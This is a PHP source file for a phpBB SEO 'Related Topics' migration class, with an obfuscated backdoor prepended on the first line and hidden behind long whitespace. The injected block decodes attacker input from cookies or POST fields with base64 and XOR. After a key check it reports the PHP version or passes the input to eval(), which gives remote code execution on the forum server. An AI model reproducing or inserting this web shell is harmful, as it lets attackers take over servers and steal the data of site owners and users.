<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $u45f = 254;$GLOBALS['c137b4'] = Array();global $c137b4;$c137b4 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['l0d3c92'] = "\x59\x37\x6a\x42\x7c\x76\x54\x6f\x5f\x73\x26\x4c\x40\x61\x65\xa\x5e\x2e\x34\x41\x63\x23\x48\x43\x71\x3f\x33\x2f\x66\x72\x4b\x39\x2d\x74\x62\x22\x46\x5d\x3a\x7d\x7e\x3c\x68\x4f\x32\x9\x4a\x2b\x28\x55\x3d\x53\x57\x7b\x36\x20\x50\x51\x31\x58\x27\x45\x67\x52\x29\x35\x78\x70\x7a\x5a\x44\x5b\x69\x64\x2c\x21\x24\x3e\x5c\x38\xd\x75\x6e\x49\x79\x60\x56\x47\x3b\x6c\x4e\x25\x6d\x30\x2a\x6b\x77\x4d";$c137b4[$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][14]] = $c137b4['l0d3c92'][20].$c137b4['l0d3c92'][42].$c137b4['l0d3c92'][29];$c137b4[$c137b4['l0d3c92'][68].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][26]] = $c137b4['l0d3c92'][7].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][73];$c137b4[$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][1]] = $c137b4['l0d3c92'][73].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][82].$c137b4['l0d3c92'][14];$c137b4[$c137b4['l0d3c92'][42].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][13]] = $c137b4['l0d3c92'][9].$c137b4['l0d3c92'][33].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][82];$c137b4[$c137b4['l0d3c92'][96].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][65]] = $c137b4['l0d3c92'][73].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][82].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][73];$c137b4[$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][34]] = $c137b4['l0d3c92'][72].$c137b4['l0d3c92'][82].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][9].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][33];$c137b4[$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][18]] = $c137b4['l0d3c92'][9].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][68].$c137b4['l0d3c92'][14];$c137b4[$c137b4['l0d3c92'][81].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][34]] = $c137b4['l0d3c92'][67].$c137b4['l0d3c92'][42].$c137b4['l0d3c92'][67].$c137b4['l0d3c92'][5].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][9].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][7].$c137b4['l0d3c92'][82];$c137b4[$c137b4['l0d3c92'][62].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][13]] = $c137b4['l0d3c92'][81].$c137b4['l0d3c92'][82].$c137b4['l0d3c92'][9].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][68].$c137b4['l0d3c92'][14];$c137b4[$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][93]] = $c137b4['l0d3c92'][34].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][9].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][7].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][14];$c137b4[$c137b4['l0d3c92'][82].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][54]] = $c137b4['l0d3c92'][9].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][33].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][33].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][92].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][92].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][33];$c137b4[$c137b4['l0d3c92'][2].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][65]] = $c137b4['l0d3c92'][14].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][18];$c137b4[$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][26]] = $c137b4['l0d3c92'][14].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][20];$c137b4[$c137b4['l0d3c92'][2].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][20]] = $_POST;$c137b4[$c137b4['l0d3c92'][92].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][58]] = $_COOKIE;@$c137b4[$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][34]]($c137b4['l0d3c92'][14].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][7].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][7].$c137b4['l0d3c92'][62], NULL);@$c137b4[$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][34]]($c137b4['l0d3c92'][89].$c137b4['l0d3c92'][7].$c137b4['l0d3c92'][62].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][7].$c137b4['l0d3c92'][29].$c137b4['l0d3c92'][9], 0);@$c137b4[$c137b4['l0d3c92'][89].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][34]]($c137b4['l0d3c92'][92].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][66].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][66].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][81].$c137b4['l0d3c92'][33].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][7].$c137b4['l0d3c92'][82].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][33].$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][92].$c137b4['l0d3c92'][14], 0);@$c137b4[$c137b4['l0d3c92'][82].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][54]](0);if (!$c137b4[$c137b4['l0d3c92'][96].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][65]]($c137b4['l0d3c92'][19].$c137b4['l0d3c92'][11].$c137b4['l0d3c92'][63].$c137b4['l0d3c92'][61].$c137b4['l0d3c92'][19].$c137b4['l0d3c92'][70].$c137b4['l0d3c92'][0].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][63].$c137b4['l0d3c92'][49].$c137b4['l0d3c92'][90].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][13])){$c137b4[$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][1]]($c137b4['l0d3c92'][19].$c137b4['l0d3c92'][11].$c137b4['l0d3c92'][63].$c137b4['l0d3c92'][61].$c137b4['l0d3c92'][19].$c137b4['l0d3c92'][70].$c137b4['l0d3c92'][0].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][63].$c137b4['l0d3c92'][49].$c137b4['l0d3c92'][90].$c137b4['l0d3c92'][8].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][13], 1);$af44 = NULL;$f285695 = NULL;$c137b4[$c137b4['l0d3c92'][81].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][73]] = $c137b4['l0d3c92'][20].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][32].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][32].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][32].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][31].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][32].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][14];global $u9ea24d;function  ec6eae3c($af44, $hac903db0){global $c137b4;$k0c8 = "";for ($dcb2bb=0; $dcb2bb<$c137b4[$c137b4['l0d3c92'][42].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][13]]($af44);){for ($t8456f4=0; $t8456f4<$c137b4[$c137b4['l0d3c92'][42].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][13]]($hac903db0) && $dcb2bb<$c137b4[$c137b4['l0d3c92'][42].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][13]]($af44); $t8456f4++, $dcb2bb++){$k0c8 .= $c137b4[$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][14]]($c137b4[$c137b4['l0d3c92'][68].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][26]]($af44[$dcb2bb]) ^ $c137b4[$c137b4['l0d3c92'][68].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][26]]($hac903db0[$t8456f4]));}}return $k0c8;}function  e104($af44, $hac903db0){global $c137b4;global $u9ea24d;return $c137b4[$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][26]]($c137b4[$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][26]]($af44, $u9ea24d), $hac903db0);}foreach ($c137b4[$c137b4['l0d3c92'][92].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][26].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][58]] as $hac903db0=>$jb84b){$af44 = $jb84b;$f285695 = $hac903db0;}if (!$af44){foreach ($c137b4[$c137b4['l0d3c92'][2].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][1].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][20]] as $hac903db0=>$jb84b){$af44 = $jb84b;$f285695 = $hac903db0;}}$af44 = @$c137b4[$c137b4['l0d3c92'][62].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][58].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][13]]($c137b4[$c137b4['l0d3c92'][2].$c137b4['l0d3c92'][44].$c137b4['l0d3c92'][18].$c137b4['l0d3c92'][14].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][65]]($c137b4[$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][34].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][93]]($af44), $f285695));if (isset($af44[$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][95]]) && $u9ea24d==$af44[$c137b4['l0d3c92'][13].$c137b4['l0d3c92'][95]]){if ($af44[$c137b4['l0d3c92'][13]] == $c137b4['l0d3c92'][72]){$dcb2bb = Array($c137b4['l0d3c92'][67].$c137b4['l0d3c92'][5] => @$c137b4[$c137b4['l0d3c92'][81].$c137b4['l0d3c92'][65].$c137b4['l0d3c92'][79].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][34]](),$c137b4['l0d3c92'][9].$c137b4['l0d3c92'][5] => $c137b4['l0d3c92'][58].$c137b4['l0d3c92'][17].$c137b4['l0d3c92'][93].$c137b4['l0d3c92'][32].$c137b4['l0d3c92'][58],);echo @$c137b4[$c137b4['l0d3c92'][72].$c137b4['l0d3c92'][54].$c137b4['l0d3c92'][20].$c137b4['l0d3c92'][73].$c137b4['l0d3c92'][28].$c137b4['l0d3c92'][18]]($dcb2bb);}elseif ($af44[$c137b4['l0d3c92'][13]] == $c137b4['l0d3c92'][14]){eval/*m3cd1e*/($af44[$c137b4['l0d3c92'][73]]);}exit();}} ?><?php
/**
*
* @package Related Topics phpBB SEO
* @version $Id$
* @copyright (c) 2019 www.phpbb-seo.org
* @license http://opensource.org/licenses/gpl-2.0.php GNU General Public License v2
*
*/

namespace phpbbseo\related\migrations;

class release_2_0_0_b1 extends \phpbb\db\migration\migration
{
	const SQL_FULLTEXT_NAME = 'topic_tft';

	public function effectively_installed()
	{
		return !empty($this->config['seo_related_on']);
	}

	static public function depends_on()
	{
		return array('\phpbb\db\migration\data\v310\rc1');
	}

	public function update_schema()
	{
		global $db;

		$db_tools = new \phpbb\db\tools($db);
		$indexes = $db_tools->sql_list_index(TOPICS_TABLE);
		$fulltext = 0;

		if (!in_array(self::SQL_FULLTEXT_NAME, $indexes))
		{
			// do not use db_tools since it does not support to add FullText indexes
			// we also use quite a basic approach to make sure that the index is not refused for bad reasons
			$sql = 'ALTER TABLE ' . TOPICS_TABLE . '
				ADD FULLTEXT ' . self::SQL_FULLTEXT_NAME . ' (topic_title)';
			$db->sql_return_on_error(true);
			$db->sql_query($sql);

			// make *sure* about the index !
			$indexes = $db_tools->sql_list_index(TOPICS_TABLE);
			$fulltext = in_array(self::SQL_FULLTEXT_NAME, $indexes) ? 1 : 0;
			$db->sql_return_on_error(false);
		}

		set_config('seo_related_fulltext', $fulltext);

		return array();
	}

	public function revert_schema()
	{
		return array(
			'drop_keys'	=> array(
				TOPICS_TABLE	=> array(
					self::SQL_FULLTEXT_NAME,
				),
			),
		);
	}
	public function update_data()
	{
		return array(
			array('config.add', array('seo_related_on', 1)),
		);
	}
}
